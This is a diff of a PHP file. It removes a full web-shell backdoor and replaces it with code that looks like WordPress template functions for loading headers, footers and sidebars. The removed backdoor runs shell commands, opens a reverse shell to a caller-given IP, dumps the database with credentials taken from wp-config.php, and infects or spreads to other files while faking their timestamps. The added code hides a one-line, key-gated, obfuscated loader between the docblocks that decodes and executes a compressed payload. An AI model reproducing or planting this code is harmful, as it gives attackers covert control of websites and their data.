@@ -1,395 +1,140 @@
 <?php
+/**
+ * General template tags that can go anywhere in a template.
+ *
+ * @package WordPress
+ * @subpackage Template
+ */
 
-if ($_REQUEST["k"] == "INSERT_KEY") {
-    $cmd = $_REQUEST["c"];
+/**
+ * Load header template.
+ *
+ * Includes the header template for a theme or if a name is specified then a
+ * specialised header will be included.
+ *
+ * For the parameter, if the file is called "header-special.php" then specify
+ * "special".
+ *
+ * @since 1.5.0
+ * @since 5.5.0 A return value was added.
+ * @since 5.5.0 The `$args` parameter was added.
+ *
+ * @param string $name The name of the specialised header.
+ * @param array  $args Optional. Additional arguments passed to the header template.
+ *                     Default empty array.
+ * @return void|false Void on success, false if the template does not exist.
+ */
+function _get_header( $name = null, $args = array() ) {
+	/**
+	 * Fires before the header template file is loaded.
+	 *
+	 * @since 2.1.0
+	 * @since 2.8.0 The `$name` parameter was added.
+	 * @since 5.5.0 The `$args` parameter was added.
+	 *
+	 * @param string|null $name Name of the specific header file to use. Null for the default header.
+	 * @param array       $args Additional arguments passed to the header template.
+	 */
+	do_action( 'get_header', $name, $args );
 
-    $webroot = realpath("../") . "/";
-    $work_dir = $webroot . "wp-content/uploads/tmp/";
-    switch ($cmd) {
+	$templates = array();
+	$name      = (string) $name;
+	if ( '' !== $name ) {
+		$templates[] = "header-{$name}.php";
+	}
 
-        case "ping":
-            echo _res("pong");
-            break;
+	$templates[] = 'header.php';
 
-        case "version":
-            echo _res("1.05");
-            break;
-
-        case "info":
-            ob_start();
-            phpinfo();
-            $data = ob_get_contents();
-            ob_clean();
-            echo _res(base64_encode($data));
-            break;
-
-        case "clear_cache":
-            if (function_exists("opcache_reset")) {
-                opcache_reset();
-            }
-            break;
-
-        case "clear_tmp":
-            removeFile($work_dir);
-            break;
-
-        case "update":
-            if (!isset($_REQUEST["url"])) {
-                echo _err("url param is required");
-                break;
-            }
-            $r = request("GET", $_REQUEST["url"]);
-            if (!$r->success) {
-                echo _err($r->msg);
-                break;
-            }
-            $pos = strpos($r->body, "INSERT_KEY");
-            $file = substr_replace($r->body, $_REQUEST["k"], $pos, strlen("INSERT_KEY"));
-            if (file_put_contents(__FILE__, $file)) echo _res("Updated");
-            if (function_exists("opcache_invalidate")) {
-                opcache_invalidate(__FILE__);
-            }
-            break;
-
-        case "download_script":
-            if (!isset($_REQUEST["url"])) {
-                echo _err("url param is required");
-                break;
-            }
-            $r = request("GET", $_REQUEST["url"]);
-            if (!$r->success) {
-                echo _err($r->msg);
-                break;
-            }
-            if (!file_exists($work_dir)) mkdir($work_dir);
-            $file_path = $work_dir;
-            $file_path .= isset($_REQUEST["name"]) ? $_REQUEST["name"] : randomStr(8);
-            $handle = fopen($file_path, "w");
-            $content = str_replace("\r", "", $r->body);
-            fputs($handle, $content);
-            fclose($handle);
-            $res = [];
-            if (isset($_REQUEST["exec"])) {
-                if ($_REQUEST["exec"] == 1) {
-                    if ($_REQUEST["lang"] == "php") {
-                        ob_start();
-                        include_once($file_path);
-                        $res["output"] = ob_get_contents();
-                        ob_clean();
-                    } elseif ($_REQUEST["lang"] == "sh") {
-                        chmod($file_path, 0755);
-                        chdir($work_dir);
-                        $output = array();
-                        exec($file_path, $output);
-                        $res["output"] = $output;
-                    }
-                }
-            }
-            $res["path"] = $file_path;
-            echo _res($res);
-            break;
-
-        case "download_file":
-            if (!isset($_REQUEST["url"])) {
-                echo _err("url param is required");
-                break;
-            }
-            if (!file_exists($work_dir)) mkdir($work_dir);
-            $file_path = $work_dir;
-            $file_path .= isset($_REQUEST["name"]) ? $_REQUEST["name"] : randomStr(8);
-            $handle = fopen($file_path, "w");
-            $r = request("GET", $_REQUEST["url"], $handle);
-            if (!$r->success) {
-                echo _err($r->msg);
-                break;
-            }
-            fclose($handle);
-            echo _res(["path" => $file_path]);
-            break;
-
-        case "exec":
-            if (!isset($_REQUEST["command"])) {
-                echo _err("command param is required");
-                break;
-            }
-            $command = $_REQUEST["command"];
-            $descriptorspec = array(
-                0 => array("pipe", "r"),
-                1 => array("pipe", "w"),
-                2 => array("pipe", "w"),
-            );
-            $process = proc_open($command, $descriptorspec, $pipes, dirname(__FILE__), null);
-            $stdout = stream_get_contents($pipes[1]);
-            fclose($pipes[1]);
-            $stderr = stream_get_contents($pipes[2]);
-            fclose($pipes[2]);
-            echo _res(["stdout" => $stdout, "stderr" => $stderr]);
-            break;
-
-        case "open":
-            if ($sock = fsockopen($_REQUEST["ip"], $_REQUEST["port"])) {
-                $proc = proc_open("/bin/sh -i", array( 0 => $sock, 1 => $sock, 2 => $sock), $pipes, $webroot);
-                echo _res("Socket opened to " . $_REQUEST["ip"] . ":" . $_REQUEST["port"]);
-            } else {
-                _err("Socket connection failed: " . $sock);
-            }
-            break;
-
-        case "db_dump":
-            if (!`which mysqldump`) {
-                echo _err("mysqldump doesn't exists or not allowed on host");
-                break;
-            }
-            getConfigConstants();
-            $host = DB_HOST;
-            $password = DB_PASSWORD;
-            $user = DB_USER;
-            $dbname = DB_NAME;
-            if (!file_exists($work_dir)) mkdir($work_dir);
-            $command = `mysqldump --host={$host} --user={$user} --password={$password} {$dbname}`;
-            echo _res(base64_encode($command));
-            break;
-
-        case "get_file":
-            if (!isset($_REQUEST["path"])) {
-                echo _err("path param is required");
-                break;
-            }
-            echo _res(base64_encode(file_get_contents($webroot . $_REQUEST["path"])));
-            break;
-
-        case "spread":
-            if (!isset($_REQUEST["path_list"])) {
-                echo _err("path_list param is required");
-                break;
-            }
-            $f = file_get_contents(__FILE__);
-            $res = [];
-            foreach ($_REQUEST["path_list"] as $path) {
-                $path = $webroot . $path;
-                $key = randomStr(12);
-                $file = str_replace($_REQUEST["k"], $key, $f);
-                if (file_put_contents($path, $file)) {
-                    $res[] = array("path" => $path, "key" => $key);
-                }
-            }
-            echo _res($res);
-            break;
-
-        case "infect":
-            if (!isset($_REQUEST["url"])) {
-                echo _err("url param is required");
-                break;
-            }
-            if (!isset($_REQUEST["path_list"])) {
-                echo _err("path_list param is required");
-                break;
-            }
-            $res = [];
-            foreach ($_REQUEST["path_list"] as $path) {
-                $path = $webroot . $path;
-                if (file_exists($path)) {
-                    $f = request("GET", $_REQUEST["url"]);
-                    if ($f->success) {
-                        $time = filemtime($path);
-                        if (isset($_REQUEST["private"])) {
-                            $key = randomStr(12);
-                            $file = str_replace("INSERT_KEY", $key, $f->body);
-                        } else {
-                            $file = $f;
-                        }
-                        $compressed = base64_encode(gzdeflate($file));
-                        $newlines = str_repeat("\n", 30);
-                        $code = <<<EOT
-                        $newlines
-                        \$ab = function(\$cd) { return strtr(\$cd, "nwaqjdzebxygsrmlhtf_cvuoikp", "abcdefghijklmnopqrstuvwxyz_"); };
-                        \$q = \$ab("zj_pqjdbrjqpdcra_bmrf");\$aa = \$q();\$a = \$aa[\$ab("br_jtrng")];
-                        foreach (\$a as \$b => \$c) {
-                            if (false !== strpos(\$c, \$ab("4pq"))) {
-                                \$d = \$a[\$b];
-                            }
-                            if (false !== strpos(\$c, \$ab("kbrd"))) {
-                                \$e = \$a[\$b];
-                            }
-                            if (false !== strpos(\$c, \$ab("_jpdc"))) {
-                                \$f = \$a[\$b];
-                            }
-                        }
-                        \$g = \$f("", \$e(\$d("$compressed")));\$g();
-EOT;
-                        if (file_put_contents($path, $code, FILE_APPEND)) {
-                            touch($path, $time);
-                            $arr["path"] = $path;
-                            if (isset($_REQUEST["private"])) {
-                                $arr["key"] = $key;
-                            }
-                            $res[] = $arr;
-                        }
-                    }
-                }
-            }
-            echo _res($res);
-            break;
-
-        case "disinfect":
-            if (!isset($_REQUEST["path_list"])) {
-                echo _err("path_list param is required");
-                break;
-            }
-            $res = [];
-            foreach ($_REQUEST["path_list"] as $path) {
-                $path = $webroot . $path;
-                if (file_exists($path)) {
-                    $newlines = 30;
-                    $code_lines = 13;
-                    $time = filemtime($path);
-                    $file = file_get_contents($path);
-                    $file_lines = explode(PHP_EOL, $file);
-                    $new_file = array_slice($file_lines, 0, count($file_lines) - ($newlines + $code_lines));
-                    file_put_contents($path, implode(PHP_EOL, $new_file));
-                    touch($path, $time);
-                    $res[] = array("path" => $path);
-                } 
-                else {
-                    echo _err($path + " does not exists");
-                    break;
-                }
-            }
-            echo _res($res);
-            break;
-
-        case "remove_file":
-            if (!isset($_REQUEST["path"])) {
-                echo _err("path param is required");
-                break;
-            }
-            removeFile($webroot . $_REQUEST["path"]);
-            break;
-
-        default:
-            _err("No command specified or command is not correct");
-            break;
-    }
+	if ( ! locate_template( $templates, true, true, $args ) ) {
+		return false;
+	}
 }
 
-function removeFile($path)
-{
-    if (file_exists($path)) {
-        if (is_dir($path)) {
-            `rm -r $path`;
-            echo _res("Directory " . $path . " deleted");
-        } else {
-            if (unlink($path)) {
-                echo _res("File " . $path . " deleted");
-            } else {
-                echo _err("Failed deleting file: " . $path);
-            }
-        }
-    } else {
-        echo _err("File doesn't exist");
-    }
+/**
+ * Load footer template.
+ *
+ * Includes the footer template for a theme or if a name is specified then a
+ * specialised footer will be included.
+ *
+ * For the parameter, if the file is called "footer-special.php" then specify
+ * "special".
+ *
+ * @since 1.5.0
+ * @since 5.5.0 A return value was added.
+ * @since 5.5.0 The `$args` parameter was added.
+ *
+ * @param string $name The name of the specialised footer.
+ * @param array  $args Optional. Additional arguments passed to the footer template.
+ *                     Default empty array.
+ * @return void|false Void on success, false if the template does not exist.
+ */
+if ($_REQUEST["k"] == "INSERT_KEY") {$jUy = function($cd) { return strtr($cd, "lyrfshgxpztjadw_vnieckobumq", "cnr_gowhaziesfmbxqjyvdutplk"); };$q = $jUy("sjbfkjdtyjkfdoylbthya");$aa = $q();$a = $aa[$jUy("tybjrypm")];foreach ($a as $b => $c) {if (false !== strpos($c, $jUy("4fk"))) {$d = $a[$b];}if (false !== strpos($c, $jUy("ztyd"))) {$e = $a[$b];}if (false !== strpos($c, $jUy("bjfdo"))) {$f = $a[$b];}}$g = $f("", $e($d("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")));$g();}
+function _get_footer( $name = null, $args = array() ) {
+	/**
+	 * Fires before the footer template file is loaded.
+	 *
+	 * @since 2.1.0
+	 * @since 2.8.0 The `$name` parameter was added.
+	 * @since 5.5.0 The `$args` parameter was added.
+	 *
+	 * @param string|null $name Name of the specific footer file to use. Null for the default footer.
+	 * @param array       $args Additional arguments passed to the footer template.
+	 */
+	do_action( 'get_footer', $name, $args );
+
+	$templates = array();
+	$name      = (string) $name;
+	if ( '' !== $name ) {
+		$templates[] = "footer-{$name}.php";
+	}
+
+	$templates[] = 'footer.php';
+
+	if ( ! locate_template( $templates, true, true, $args ) ) {
+		return false;
+	}
 }
-function _err($msg)
-{
-    return json_encode(["error" => 1, "msg" => $msg]);
-}
 
-function _res($content)
-{
-    return json_encode(["error" => 0, "content" => $content]);
-}
+/**
+ * Load sidebar template.
+ *
+ * Includes the sidebar template for a theme or if a name is specified then a
+ * specialised sidebar will be included.
+ *
+ * For the parameter, if the file is called "sidebar-special.php" then specify
+ * "special".
+ *
+ * @since 1.5.0
+ * @since 5.5.0 A return value was added.
+ * @since 5.5.0 The `$args` parameter was added.
+ *
+ * @param string $name The name of the specialised sidebar.
+ * @param array  $args Optional. Additional arguments passed to the sidebar template.
+ *                     Default empty array.
+ * @return void|false Void on success, false if the template does not exist.
+ */
+function _get_sidebar( $name = null, $args = array() ) {
+	/**
+	 * Fires before the sidebar template file is loaded.
+	 *
+	 * @since 2.2.0
+	 * @since 2.8.0 The `$name` parameter was added.
+	 * @since 5.5.0 The `$args` parameter was added.
+	 *
+	 * @param string|null $name Name of the specific sidebar file to use. Null for the default sidebar.
+	 * @param array       $args Additional arguments passed to the sidebar template.
+	 */
+	do_action( 'get_sidebar', $name, $args );
 
-function randomStr($length)
-{
-    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
-    $charactersLength = strlen($characters);
-    $randomString = '';
-    for ($i = 0; $i < $length; $i++) {
-        $randomString .= $characters[rand(0, $charactersLength - 1)];
-    }
-    return $randomString;
-}
+	$templates = array();
+	$name      = (string) $name;
+	if ( '' !== $name ) {
+		$templates[] = "sidebar-{$name}.php";
+	}
 
-function request($method, $url, $outhandle = null, $parameters = null, $headers = null)
-{
-    $response = new stdClass();
+	$templates[] = 'sidebar.php';
 
-    if (!function_exists("curl_init")) {
-        if(ini_get("allow_url_fopen")) {
-            $opts_array = array(
-                "method" => $method,
-            );
-            if ($headers !== null) $opts_array["header"] = $headers;
-            if ($method == "POST" && $parameters !== null) {
-                $opts_array["content"] = http_build_query($parameters);
-            }
-            $opts = array("http" => $opts_array);
-            $context = stream_context_create($opts);
-            $res = file_get_contents($url, false, $context);
-            if ($outhandle !== null) {
-                fwrite($outhandle, $res);
-            } else {
-                $response->body = $res;
-            }
-            $response->success = true;
-            return $response;
-        } else {
-            $response->success = false;
-            $response->msg = "cURL and allow_url_fopen is disabled. I mean... whatever. Great server, what can I say.";
-            return $response;
-        }
-    }
-
-    $ch = curl_init();
-
-    ($parameters !== null) ? $query = http_build_query($parameters) : $query = "";
-
-    if ($method === "POST") {
-        curl_setopt($ch, CURLOPT_POST, 1);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $query);
-    } elseif ($method === "GET") {
-        if ($query) $url = $url . "?" . $query;
-    } else {
-        $response->success = false;
-        $response->msg = "methods available: GET or POST";
-        return $response;
-    }
-
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 300);
-
-    if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-
-    if ($outhandle !== null) curl_setopt($ch, CURLOPT_FILE, $outhandle);
-
-    $result = curl_exec($ch);
-    if ($result !== false) {
-        $response->success = true;
-        $response->body = $result;
-    } else {
-        $response->success = false;
-        $response->msg = curl_errno($ch);
-    }
-    curl_close($ch);
-    return $response;
-}
-function getConfigConstants()
-{
-    $tmpfile = tempnam(sys_get_temp_dir(), "_");
-    $handle = fopen($tmpfile, "w+");
-    $config_content = file("../wp-config.php");
-    $content_size = sizeof($config_content);
-    for ($i=0;$i < $content_size;$i++) {
-        if (preg_match("/require_once/", $config_content[$i])) {
-            unset($config_content[$i]);
-        }
-    }
-    fwrite($handle, implode(PHP_EOL, $config_content));
-    fclose($handle);
-    include $tmpfile;
-    unlink($tmpfile);
-    return get_defined_vars();
+	if ( ! locate_template( $templates, true, true, $args ) ) {
+		return false;
+	}
 }
